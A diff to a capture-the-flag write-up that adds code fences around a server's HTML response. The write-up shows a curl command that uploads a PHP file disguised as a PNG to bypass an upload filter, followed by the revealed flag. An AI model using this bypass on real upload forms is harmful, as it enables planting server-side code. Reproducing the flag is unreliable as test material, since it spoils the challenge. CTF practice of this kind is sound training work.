@@ -3,6 +3,7 @@
 We send the file as if it was a PNG file:   
 ``curl -F "file=@upload2.png;filename=upload2.php" chal8.hackademy.ctf/upload2.php``
 
+```
 <!DOCTYPE html>
 <html>
     <head>
@@ -22,6 +23,7 @@ We send the file as if it was a PNG file:
                 <div class="alert alert-success">You have successfully uploaded your file.<br>FLAG-hJFasjrdoTPMNXUW7floA9nib8g5VwH0</div>            </form>
         </div>
     </body>
-</html>%   
+</html>%
+```   
 
 ``FLAG-hJFasjrdoTPMNXUW7floA9nib8g5VwH0``
